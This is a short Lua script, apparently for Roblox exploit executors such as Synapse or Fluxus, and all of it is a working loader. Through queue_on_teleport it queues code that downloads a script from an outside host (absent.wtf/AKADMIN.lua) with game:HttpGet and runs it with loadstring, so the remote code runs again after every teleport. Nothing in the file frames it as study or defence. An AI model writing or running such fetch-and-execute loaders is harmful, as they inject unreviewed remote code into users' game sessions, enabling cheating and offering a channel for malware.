repeat task.wait() until game:IsLoaded()
task.wait(1)

local p = game:GetService("Players")
local lp = p.LocalPlayer

if not lp then
    repeat task.wait() until p.LocalPlayer
    lp = p.LocalPlayer
end

local function chk(t, f, fb)
    if type(f) == t then return f end
    return fb
end

local qt = chk("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
local url = "https://absent.wtf/AKADMIN.lua"

if qt then
    local qc = string.format([[
        repeat task.wait() until game:IsLoaded()
        task.wait(2)
        pcall(function()
            loadstring(game:HttpGet("%s"))()
        end)
    ]], url)
    qt(qc)
end
